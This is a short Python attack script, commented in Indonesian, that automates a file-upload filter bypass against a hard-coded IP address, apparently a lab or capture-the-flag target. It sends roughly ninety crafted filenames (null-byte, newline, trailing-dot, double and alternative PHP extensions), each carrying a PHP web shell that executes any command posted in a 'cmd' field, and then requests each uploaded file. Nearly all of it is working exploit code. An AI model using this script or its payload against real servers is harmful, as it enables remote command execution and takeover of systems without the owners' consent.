import requests

# Wordlist berdasarkan kombinasi yang diberikan
wordlist = [
   "shell.phar.jpg", "shell%20.php.jpg", "shell.php%20.jpg", "shell.jpg%20.php", "shell.jpg.php%20",
    "shell%20.phps.jpg", "shell.phps%20.jpg", "shell.jpg%20.phps", "shell.jpg.phps%20",
    "shell%0a.php.jpg", "shell.php%0a.jpg", "shell.jpg%0a.php", "shell.jpg.php%0a",
    "shell%0a.phps.jpg", "shell.phps%0a.jpg", "shell.jpg%0a.phps", "shell.jpg.phps%0a",
    "shell%00.php.jpg", "shell.php%00.jpg", "shell.jpg%00.php", "shell.jpg.php%00",
    "shell%00.phps.jpg", "shell.phps%00.jpg", "shell.jpg%00.phps", "shell.jpg.phps%00",
    "shell%0d0a.php.jpg", "shell.php%0d0a.jpg", "shell.jpg%0d0a.php", "shell.jpg.php%0d0a",
    "shell%0d0a.phps.jpg", "shell.phps%0d0a.jpg", "shell.jpg%0d0a.phps", "shell.jpg.phps%0d0a",
    "shell/.php.jpg", "shell.php/.jpg", "shell.jpg/.php", "shell.jpg.php/",
    "shell/.phps.jpg", "shell.phps/.jpg", "shell.jpg/.phps", "shell.jpg.phps/",
    "shell.\\.php.jpg", "shell.php.\\.jpg", "shell.jpg.\\.php", "shell.jpg.php.\\",
    "shell.\\.phps.jpg", "shell.phps.\\.jpg", "shell.jpg.\\.phps", "shell.jpg.phps.\\",
    "shell..php.jpg", "shell.php..jpg", "shell.jpg..php", "shell.jpg.php.",
    "shell..phps.jpg", "shell.phps..jpg", "shell.jpg..phps", "shell.jpg.phps.",
    "shell….php.jpg", "shell.php….jpg", "shell.jpg….php", "shell.jpg.php…",
    "shell….phps.jpg", "shell.phps….jpg", "shell.jpg….phps", "shell.jpg.phps…",
    "shell:.php.jpg", "shell.php:.jpg", "shell.jpg:.php", "shell.jpg.php:",
    "shell:.phps.jpg", "shell.phps:.jpg", "shell.jpg:.phps", "shell.jpg.phps:",
    "shell.jpeg.php", "shell.jpg.php", "shell.png.php", "shell.php",
    "shell.php3", "shell.php4", "shell.php5", "shell.php7", "shell.php8",
    "shell.pht", "shell.phar", "shell.phpt", "shell.pgif", "shell.phtml",
    "shell.phtm", "shell.php%00.gif", "shell.php\\x00.gif", "shell.php%00.png",
    "shell.php\\x00.png", "shell.php%00.jpg", "shell.php\\x00.jpg"
]

BASEURL = "http://83.136.251.216:45049"  
uploadURL = BASEURL + "/upload.php"

payload = """<?php
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>"""


for filename in wordlist:
    files = {'uploadFile': (filename, payload)}
    response = requests.post(uploadURL, files=files)
    if "successfully uploaded" in response.text:
        print(f"File berhasil diunggah: {filename}")
        accesssImageURL = BASEURL + f"/profile_images/{filename}"
        access = requests.get(url=accesssImageURL)
        print(f"Response : {access}")
    else:
        print(f"File gagal diunggah: {filename}")

